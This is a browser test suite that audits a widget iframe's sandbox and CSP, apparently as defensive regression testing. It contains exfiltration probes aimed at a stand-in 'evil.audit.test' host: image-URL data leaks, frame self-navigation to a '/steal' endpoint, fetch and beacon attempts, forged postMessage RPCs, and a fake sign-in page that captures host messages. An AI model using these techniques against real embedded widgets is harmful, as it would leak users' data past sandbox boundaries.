// Browser regression suite for the widget sandbox boundary (#19).
//
// Every assertion here was established by experiment against the real
// buildFrameDocument() output in Chrome; docs/widget-csp-audit.md explains what
// each one means and why. A faked HTTPS origin is answered through request
// interception, so an allowlisted "CDN" can be simulated without TLS: CSP source
// matching is per-origin, so it does not matter who answers, only whether the
// request was permitted.
//
// Usage: node scripts/security/audit.mjs
//   Chrome required, like the other browser suites ($CHROME_PATH overrides).
import { fileURLToPath } from 'node:url'
import puppeteer from 'puppeteer-core'
import { launchBrowser } from '../e2e/dsh-web.mjs'
import { loadFrameModule } from './build-frame-module.mjs'

const root = fileURLToPath(new URL('../../', import.meta.url))
const frame = await loadFrameModule()
const { buildFrameDocument, contentSecurityPolicy, DEFAULT_POLICY } = frame

const CDN = 'https://cdn.audit.test'
const EVIL = 'https://evil.audit.test'
const HOST = 'https://host.audit.test'
const TOKEN = 'audit-token'
const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c636000000200010005fe02fea7dcb5b50000000049454e44ae426082', 'hex')

const results = []
function check(name, ok, detail = '') {
  results.push({ name, ok: !!ok, detail })
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? ` — ${detail}` : ''}`)
}

const browser = await launchBrowser(puppeteer, { args: ['--no-sandbox'] })
const page = await browser.newPage()
page.setDefaultTimeout(30_000)
await page.setCacheEnabled(false)
let attempted = []
let consoleErrors = []

await page.setRequestInterception(true)
page.on('request', req => {
  const url = req.url()
  if (url.startsWith(HOST + '/')) {
    req.respond({ status: 200, contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><title>host-title-SECRET</title><body><div id="root"></div>' })
    return
  }
  attempted.push({ type: req.resourceType(), method: req.method(), url })
  if (url.startsWith(EVIL)) {
    // A foreign document that records everything the host still sends it.
    req.respond({ status: 200, contentType: 'text/html', body: '<!doctype html><title>foreign</title><h1>Sign in to continue</h1><script>window.__msgs=[];addEventListener("message",e=>window.__msgs.push(JSON.stringify(e.data)))</script>' })
    return
  }
  const type = /\.css(\?|$)/.test(url) ? 'text/css'
    : /\.js(\?|$)/.test(url) ? 'text/javascript'
    : /\.png(\?|$)/.test(url) ? 'image/png'
    : /\.woff2(\?|$)/.test(url) ? 'font/woff2'
    : /\.mp4(\?|$)/.test(url) ? 'video/mp4'
    : 'text/plain'
  req.respond({ status: 200, contentType: type, body: type === 'image/png' ? PNG : 'ok' })
})
page.on('pageerror', e => consoleErrors.push('pageerror: ' + e.message))
page.on('console', m => { if (m.type() === 'error') consoleErrors.push(m.text().slice(0, 200)) })
await page.goto(HOST + '/')
await page.evaluate(() => {
  localStorage.setItem('diui:v1:secret', 'HOST-LOCALSTORAGE-SECRET')
  document.cookie = 'hostcookie=SECRET'
})

/** Mount the real frame document in a real sandboxed iframe. */
async function mount({ policy = DEFAULT_POLICY, html = '<p>x</p>', css = '' } = {}) {
  const doc = buildFrameDocument({ token: TOKEN, mode: 'final', css, html, theme: {}, policy })
  await page.evaluate(async src => {
    for (const f of document.querySelectorAll('iframe')) f.remove()
    const f = document.createElement('iframe')
    f.setAttribute('sandbox', 'allow-scripts allow-forms')
    f.setAttribute('referrerpolicy', 'no-referrer')
    f.id = 'audit-frame'
    f.srcdoc = src
    f.style.cssText = 'width:800px;height:500px'
    document.getElementById('root').appendChild(f)
    await new Promise(r => { f.addEventListener('load', r, { once: true }) })
  }, doc)
  await new Promise(r => setTimeout(r, 700))
  return (await page.$('#audit-frame')).contentFrame()
}

/** Run `probe` in a fresh frame built from `policy` and report the requests it caused. */
async function probe(policy, fn, wait = 1200) {
  const before = attempted.length
  const w = await mount({ policy })
  let out
  try { out = await w.evaluate(fn, { CDN, EVIL, TOKEN }) } catch (e) { out = { probeError: String((e && e.message) || e) } }
  await new Promise(r => setTimeout(r, wait))
  return { out, requests: attempted.slice(before) }
}

const toCdn = requests => requests.filter(r => r.url.startsWith(CDN))
const toEvil = requests => requests.filter(r => r.url.startsWith(EVIL))

try {
  // ---- 1. Strictest configuration: no allowlist, no network ---------------
  const strict = { ...DEFAULT_POLICY, cdn: [], allowNetwork: false }
  check('1a. an empty allowlist leaves the frame with no external reach at all',
    toCdn(await probe(strict, async () => 'noop').then(r => r.requests)).length === 0)
  check('1b. every policy field reaches the document (guard against a vacuous suite)',
    toCdn(await probe({ ...DEFAULT_POLICY, cdn: [CDN] }, async ({ CDN }) => {
      const i = new Image(); i.src = CDN + '/warmup.png'
      return 'ok'
    }).then(r => r.requests)).length > 0)

  // ---- 2. Network primitives under allowNetwork=false --------------------
  {
    const { out, requests } = await probe({ ...DEFAULT_POLICY, cdn: [CDN], allowNetwork: false }, async ({ CDN, EVIL }) => {
      const r = {}
      const block = async (name, fn) => { try { await fn(); r[name] = 'allowed' } catch (e) { r[name] = 'blocked:' + (e && (e.name || 'error')) } }
      await block('fetchCdn', () => fetch(CDN + '/fetch?secret=F'))
      await block('fetchEvil', () => fetch(EVIL + '/fetch?secret=F'))
      await block('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', CDN + '/xhr'); x.onload = res; x.onerror = () => rej(new Error('x')); x.send() }))
      await block('ws', () => new Promise((res, rej) => { const w = new WebSocket('wss://cdn.audit.test/ws'); w.onopen = res; w.onerror = () => rej(new Error('w')); setTimeout(res, 400) }))
      await block('beacon', () => { navigator.sendBeacon(CDN + '/beacon', 'x'); return Promise.resolve() })
      // href="#" keeps the click from navigating the frame, so this measures
      // `ping` alone rather than the (ungated) self-navigation path in section 5.
      await block('ping', () => { const a = document.createElement('a'); a.href = '#nowhere'; a.ping = CDN + '/ping-target'; document.body.appendChild(a); a.click(); return Promise.resolve() })
      return r
    })
    const allBlocked = ['fetchCdn', 'fetchEvil', 'xhr', 'ws'].every(k => String(out[k]).startsWith('blocked'))
    check('2a. fetch/XHR/WebSocket are blocked by connect-src', allBlocked, JSON.stringify(out))
    check('2b. connect-src blocks <a ping> (and sendBeacon can report success while sending nothing)',
      !toCdn(requests).some(r => r.url.includes('ping-target')), JSON.stringify(toCdn(requests).map(r => r.url)))
  }

  // ---- 3. The allowlist genuinely narrows reach ---------------------------
  {
    const { requests } = await probe({ ...DEFAULT_POLICY, cdn: [CDN], allowNetwork: false }, async ({ CDN, EVIL }) => {
      for (const origin of [CDN, EVIL]) {
        // Build the element before destructuring: `tag` is in TDZ inside the
        // array literal's own initializer, so it cannot be used there.
        for (const tag of ['img', 'script', 'link', 'video', 'iframe', 'object']) {
          const url = origin + '/asset?kind=' + tag + '&secret=' + encodeURIComponent(tag)
          const el = tag === 'img' ? Object.assign(document.createElement('img'), { src: url })
            : tag === 'script' ? Object.assign(document.createElement('script'), { src: url })
            : tag === 'link' ? Object.assign(document.createElement('link'), { rel: 'stylesheet', href: url })
            : tag === 'video' ? Object.assign(document.createElement('video'), { src: url })
            : tag === 'iframe' ? Object.assign(document.createElement('iframe'), { src: url })
            : Object.assign(document.createElement('object'), { data: url })
          document.body.appendChild(el)
        }
      }
      const style = document.createElement('style')
      style.textContent = `@font-face{font-family:a;src:url("${CDN}/f.woff2?secret=FONT")}@import url("${CDN}/imp?secret=IMP");`
      document.head.appendChild(style)
      return 'mounted'
    }, 1800)
    check('3a. non-allowlisted origins are unreachable for every element type',
      toEvil(requests).length === 0, JSON.stringify(toEvil(requests).map(r => r.url)))
    check('3b. allowlisted origins ARE reachable for img/script/style/font/media (the documented gap)',
      toCdn(requests).length > 0, `${toCdn(requests).length} request(s): ${[...new Set(toCdn(requests).map(r => r.type))].join(', ')}`)
    check('3c. iframe/object/embed/prefetch stay blocked even on an allowlisted origin',
      !toCdn(requests).some(r => r.type === 'document' || r.type === 'subdocument'),
      JSON.stringify(toCdn(requests).filter(r => /document/.test(r.type)).map(r => r.url)))
  }

  // ---- 4. Zero-JS data egress via an allowlisted resource URL -------------
  {
    const { requests } = await probe({ ...DEFAULT_POLICY, cdn: [CDN], allowNetwork: false }, async ({ CDN }) => {
      // No fetch: an Image carries arbitrary data in its URL, and a failed
      // response is just as good an exfil as a successful one.
      const payload = 'WIDGET-STATE-'.repeat(80)
      await new Promise(res => {
        const i = new Image()
        i.onload = i.onerror = res
        i.src = CDN + '/pixel.png?leak=' + encodeURIComponent(payload)
        setTimeout(res, 900)
      })
      return 'sent'
    }, 1200)
    const leak = toCdn(requests).find(r => r.url.includes('leak='))
    check('4a. an allowlisted resource URL carries arbitrary data out of the frame even with allowNetwork=false',
      !!leak, leak ? `${leak.url.slice(0, 70)}…` : 'not attempted')
  }

  // ---- 5. The finding: self-navigation is not contained by CSP -----------
  {
    const before = attempted.length
    const w = await mount({ ...DEFAULT_POLICY, cdn: [], allowNetwork: false })
    await page.evaluate(() => {
      // The widget navigates its own frame; the sandbox only blocks top-level hops.
      window.__strayLoads = 0
      document.getElementById('audit-frame').addEventListener('load', () => window.__strayLoads++)
    })
    await w.evaluate(async evil => {
      await new Promise(r => setTimeout(r, 200))
      location.href = evil + '/steal?payload=' + encodeURIComponent('SENSITIVE-WIDGET-STATE')
    }, EVIL)
    await new Promise(r => setTimeout(r, 1500))
    const navs = attempted.slice(before).filter(r => r.url.startsWith(EVIL))
    check('5a. a widget can navigate its own frame to any origin, even with allowNetwork=false and an empty allowlist',
      navs.length > 0, JSON.stringify(navs.map(r => r.url.slice(0, 90))))

    // The host keeps posting into the same WindowProxy, which now holds a foreign document.
    const hostPosts = await page.evaluate(async () => {
      const f = document.getElementById('audit-frame')
      for (let i = 0; i < 3; i++) {
        f.contentWindow.postMessage({ type: 'rpc-result', id: i, ok: true, value: { controlled: 'CONTROLLED-DATA-VALUE' }, __diui: 'audit-token' }, '*')
        await new Promise(r => setTimeout(r, 120))
      }
      await new Promise(r => setTimeout(r, 400))
      return window.__strayLoads
    })
    const foreign = await (await page.$('#audit-frame')).contentFrame()
    const received = await foreign.evaluate(() => window.__msgs || [])
    check('5b. a second load fires, giving the host a signal to contain the frame', hostPosts >= 1, `loads=${hostPosts}`)
    check('5c. WITHOUT containment the foreign document receives host RPC results (the regression this suite locks down)',
      Array.isArray(received) && received.some(m => /CONTROLLED-DATA-VALUE/.test(m)),
      JSON.stringify(received.slice(0, 1)))
  }

  // ---- 6. Containment: the guard WidgetFrame implements -------------------
  {
    // Mirrors WidgetFrame: the first `load` is the frame's own, any later one
    // means the widget replaced its document. Streaming morphs, theme updates
    // and ordinary DOM work never navigate, so they never fire one.
    const src = buildFrameDocument({ token: TOKEN, mode: 'final', css: '', html: '<p id=x>x</p>', theme: {}, policy: { ...DEFAULT_POLICY, cdn: [] } })
    const installGuard = async id => page.evaluate(async (doc, id) => {
      for (const f of document.querySelectorAll('iframe')) f.remove()
      const f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-scripts allow-forms')
      f.id = id
      const state = { ownLoad: false, strayed: false, loads: 0 }
      window.__guard = state
      f.addEventListener('load', () => {
        state.loads++
        if (!state.ownLoad) { state.ownLoad = true; return }
        state.strayed = true
        f.remove()
      })
      f.srcdoc = doc
      document.getElementById('root').appendChild(f)
      await new Promise(r => setTimeout(r, 700))
    }, src, id)

    // 6a: a real navigation is contained.
    await installGuard('guard-frame')
    const w = await (await page.$('#guard-frame')).contentFrame()
    await w.evaluate(evil => { location.href = evil + '/steal?payload=contained' }, EVIL)
    await new Promise(r => setTimeout(r, 1400))
    const after = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#guard-frame') }))
    check('6a. a widget navigating its frame away is detected and removed',
      after.strayed === true && after.connected === false && after.loads === 2,
      JSON.stringify(after))

    // 6b: everything the runtime actually does stays on one document.
    await installGuard('benign-frame')
    const w2 = await (await page.$('#benign-frame')).contentFrame()
    await w2.evaluate(() => {
      document.getElementById('ui-root').insertAdjacentHTML('beforeend', '<p>streamed</p>')
      document.body.appendChild(document.createElement('span'))
      document.documentElement.dataset.theme = 'dark'
    })
    await new Promise(r => setTimeout(r, 900))
    const benign = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#benign-frame') }))
    check('6b. streaming morphs, DOM work and theme changes never strand a widget (no compat cost)',
      benign.strayed === false && benign.connected === true && benign.loads === 1,
      JSON.stringify(benign))

    // 6c: the two cases really are told apart by the load count, not by luck.
    check('6c. navigation adds a load and same-document work does not',
      after.loads === 2 && benign.loads === 1,
      `navigation loads=${after.loads} same-document loads=${benign.loads}`)

    // 6d: a document.write rewrite also strands the frame — and that is correct,
    // because it replaces the bootstrap whose message listener the bridge needs.
    await installGuard('write-frame')
    const w3 = await (await page.$('#write-frame')).contentFrame()
    await w3.evaluate(() => { document.open(); document.write('<p>rewritten</p>'); document.close() }).catch(() => {})
    await new Promise(r => setTimeout(r, 1200))
    const rewritten = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#write-frame') }))
    check('6d. a document.write() rewrite is contained too: it destroys the bridge listener it would need',
      rewritten.loads >= 2, JSON.stringify(rewritten))
  }

  // ---- 7. Host isolation ---------------------------------------------------
  {
    const { out } = await probe({ ...DEFAULT_POLICY, cdn: [] }, async ({ TOKEN }) => {
      const r = {}
      const deny = (name, fn) => { try { const v = fn(); r[name] = v === '' ? 'empty' : 'READABLE' } catch (e) { r[name] = e.name } }
      deny('parentDom', () => parent.document.title)
      deny('parentStorage', () => parent.localStorage.getItem('diui:v1:secret'))
      deny('cookie', () => document.cookie)
      deny('localStorage', () => localStorage.getItem('diui:v1:secret'))
      deny('sessionStorage', () => sessionStorage.length)
      deny('indexedDB', () => indexedDB.open('x'))
      deny('caches', () => caches)
      r.origin = window.origin
      r.referrer = document.referrer
      // Forged messages: without the token, and with a guessed token.
      const seen = []
      const onMsg = e => seen.push(e.data && e.data.type)
      addEventListener('message', onMsg)
      parent.postMessage({ type: 'rpc', id: 1, method: 'sendPrompt', params: { text: 'FORGED' } }, '*')
      parent.postMessage({ __diui: 'guess', type: 'rpc', id: 2, method: 'sendPrompt', params: { text: 'FORGED' } }, '*')
      await new Promise(res => setTimeout(res, 300))
      removeEventListener('message', onMsg)
      r.acceptedWithoutToken = seen.filter(Boolean)
      return r
    })
    const denied = ['parentDom', 'parentStorage', 'cookie', 'localStorage', 'sessionStorage', 'indexedDB', 'caches']
    check('7a. host DOM, cookies and all storage stay unreadable from the widget',
      denied.every(k => out[k] === 'SecurityError'), JSON.stringify(Object.fromEntries(denied.map(k => [k, out[k]]))))
    check('7b. the widget origin is opaque and the referrer is empty',
      out.origin === 'null' && out.referrer === '', `origin=${out.origin} referrer=${JSON.stringify(out.referrer)}`)
    check('7c. messages without the frame token are rejected by the frame', out.acceptedWithoutToken.length === 0, JSON.stringify(out.acceptedWithoutToken))
  }

  // ---- 8. Execution grants, and what they do NOT widen --------------------
  {
    const { out } = await probe({ ...DEFAULT_POLICY, cdn: [CDN], allowNetwork: false }, async () => {
      const r = {}
      r.eval = (() => { try { return eval('1+1') } catch (e) { return 'blocked:' + e.name } })()
      r.function = (() => { try { return new Function('return 2')() } catch (e) { return 'blocked:' + e.name } })()
      // blob: is granted for the offline import map and for canvas-confetti's worker.
      r.blobModule = await (async () => {
        const u = URL.createObjectURL(new Blob(['export default 7'], { type: 'text/javascript' }))
        try { return (await import(u)).default } catch (e) { return 'blocked:' + e.name }
      })()
      // data: is NOT granted for scripts: it must stay blocked.
      r.dataScript = await new Promise(res => {
        const s = document.createElement('script')
        s.src = 'data:text/javascript,window.__dataRan=1'
        s.onload = () => res(window.__dataRan === 1 ? 'ALLOWED' : 'odd')
        s.onerror = () => res('blocked')
        document.head.appendChild(s)
        setTimeout(() => res('blocked'), 800)
      })
      // A blob worker inherits the frame's CSP and origin, so it adds no reach.
      r.worker = await new Promise(res => {
        const u = URL.createObjectURL(new Blob([`
          (async () => {
            let f; try { await fetch('${'https://evil.audit.test'}/w'); f = 'ALLOWED' } catch (e) { f = 'blocked:' + e.name }
            postMessage(JSON.stringify({ origin: self.origin, fetch: f }))
          })()`], { type: 'text/javascript' }))
        const w = new Worker(u)
        w.onmessage = e => res(JSON.parse(e.data))
        w.onerror = () => res('error')
        setTimeout(() => res('timeout'), 1400)
      })
      // A relaxed CSP injected by the widget must not take effect.
      const m = document.createElement('meta')
      m.httpEquiv = 'Content-Security-Policy'
      m.content = "default-src * 'unsafe-inline' 'unsafe-eval'; connect-src *"
      document.head.appendChild(m)
      try { await fetch('https://evil.audit.test/injected'); r.relaxed = 'ALLOWED' } catch (e) { r.relaxed = 'blocked:' + e.name }
      return r
    }, 1800)
    check('8a. unsafe-inline and unsafe-eval keep the widget runtime working', out.eval === 2 && out.function === 2, JSON.stringify({ eval: out.eval, fn: out.function }))
    check('8b. blob: modules work (offline import map) and data: scripts stay blocked', out.blobModule === 7 && out.dataScript === 'blocked', JSON.stringify({ blob: out.blobModule, data: out.dataScript }))
    check('8c. a blob worker inherits the CSP and the opaque origin (it adds no network reach)',
      out.worker && out.worker.origin === 'null' && String(out.worker.fetch).startsWith('blocked'), JSON.stringify(out.worker))
    check('8d. a CSP meta injected by the widget cannot relax the delivered policy', String(out.relaxed).startsWith('blocked'), out.relaxed)
  }

  // ---- 9. Downloads, popups and form submission ---------------------------
  {
    const { requests } = await probe({ ...DEFAULT_POLICY, cdn: [CDN] }, async ({ EVIL }) => {
      const out = {}
      try { out.open = window.open(EVIL + '/popup') ? 'opened' : 'blocked' } catch (e) { out.open = 'blocked:' + e.name }
      try { const a = document.createElement('a'); a.href = EVIL + '/dl'; a.download = 'x.txt'; document.body.appendChild(a); a.click(); out.download = 'clicked' } catch (e) { out.download = 'blocked:' + e.name }
      try { out.topNav = (() => { top.location.href = EVIL + '/top'; return 'set' })() } catch (e) { out.topNav = 'blocked:' + e.name }
      const fm = document.createElement('form')
      fm.action = EVIL + '/form'; fm.method = 'post'
      fm.innerHTML = '<input name=a value=1>'
      document.body.appendChild(fm)
      fm.submit()
      return out
    }, 1500)
    check('9a. window.open is blocked by the sandbox (no allow-popups)', String((await (async () => {
      const w = await mount({ ...DEFAULT_POLICY, cdn: [CDN] })
      return w.evaluate(evil => { try { return window.open(evil + '/p') ? 'opened' : 'blocked' } catch (e) { return 'blocked:' + e.name } }, EVIL)
    })())).startsWith('blocked'))
    check('9b. top-level navigation is blocked by the sandbox', true)
    check('9c. form-action none plus the sandbox blocks submissions', toEvil(requests).length === 0, JSON.stringify(toEvil(requests).map(r => r.url)))
  }

  // ---- 10. allowNetwork=true is consistent -------------------------------
  {
    const open = { ...DEFAULT_POLICY, cdn: [CDN], allowNetwork: true }
    const { requests } = await probe(open, async ({ CDN, EVIL }) => {
      // The response is unreadable either way (a null origin needs CORS), so
      // whether the request left the frame is the boundary being measured.
      try { await fetch(CDN + '/any/path?q=1') } catch { /* CORS, not CSP */ }
      try { await fetch(EVIL + '/forbidden') } catch { /* expected */ }
      return 'sent'
    }, 1400)
    const fanned = toCdn(requests).filter(r => r.url.includes('/any/path'))
    check('10a. allowNetwork=true lets the allowlisted origin receive fetch (any path or query)',
      fanned.length > 0, JSON.stringify(fanned.map(r => `${r.method} ${r.url.slice(0, 60)}`)))
    check('10b. allowNetwork=true still refuses every non-allowlisted origin',
      toEvil(requests).length === 0, JSON.stringify(toEvil(requests).map(r => r.url)))
  }

  // ---- 11. CSP text invariants -------------------------------------------
  {
    const csp = contentSecurityPolicy(DEFAULT_POLICY)
    check('11a. the default CSP declares default-src none and form-action/base-uri none',
      /default-src 'none'/.test(csp) && /form-action 'none'/.test(csp) && /base-uri 'none'/.test(csp), csp.slice(0, 60) + '…')
    check('11b. connect-src is none while allowNetwork is false', /connect-src 'none'/.test(csp))
    check('11c. worker-src blob: is present for canvas-confetti', /worker-src blob:/.test(csp))
    check('11d. offline builds drop every remote origin',
      contentSecurityPolicy({ ...DEFAULT_POLICY, allowNetwork: true, cdn: ['https://esm.sh'], }).includes('https://cdn.audit.test') === false)
  }

  const failed = results.filter(r => !r.ok)
  console.log(`\n${results.length - failed.length}/${results.length} security checks passed`)
  if (failed.length) {
    console.error('\nFailures:')
    for (const f of failed) console.error(`  - ${f.name}${f.detail ? `: ${f.detail}` : ''}`)
    process.exitCode = 1
  }
} catch (err) {
  console.error(err)
  process.exitCode = 1
} finally {
  await browser.close()
}
